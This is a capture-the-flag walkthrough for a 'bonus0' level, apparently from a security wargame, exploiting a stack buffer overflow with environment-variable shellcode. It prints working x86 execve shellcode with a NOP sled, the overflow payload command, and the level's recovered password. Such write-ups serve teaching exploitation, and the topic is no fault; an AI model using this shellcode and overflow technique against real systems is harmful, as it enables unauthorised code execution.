# Bonus 00 Walkthrough

## Binary analysis

The binary is vulnerable to a buffer overflow. We can exploit this by placing shellcode in an environment variable and overflowing the buffer to redirect execution to this shellcode.

### Key exploitation steps
- Place shellcode in an environment variable (e.g., SC)
- Overflow the buffer and overwrite the return address with the address of the shellcode in the environment

## Exploitation

1. Export the shellcode in an environment variable:
   ```bash
   export SC=$(python -c 'print(b"\x90"*5000 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
   ```
2. Find the approximate address of the environment variable (using gdb and `x/2000s (char **)environ`).
3. Overflow the buffer and overwrite the return address with the address of the shellcode:
   ```bash
   (python -c 'print(b"A"*20)'; python -c 'print(b"B"*9+b"\xbf\xff\xeb\xff"[::-1]+b"C"*42)'; cat -) | ./bonus0
   ```
   (Replace `\xbf\xff\xeb\xff` with the correct address for your environment)

## Commands used

```
export SC=$(python -c 'print(b"\x90"*5000 + b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")')
(python -c 'print(b"A"*20)'; python -c 'print(b"B"*9+b"\xbf\xff\xeb\xff"[::-1]+b"C"*42)'; cat -) | ./bonus0
cat /home/user/bonus1/.pass
```

## Result

After running the exploit, we get a shell as bonus1 and can read the password:

```
cat /home/user/bonus1/.pass
cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
```

Copy the password for the next level. 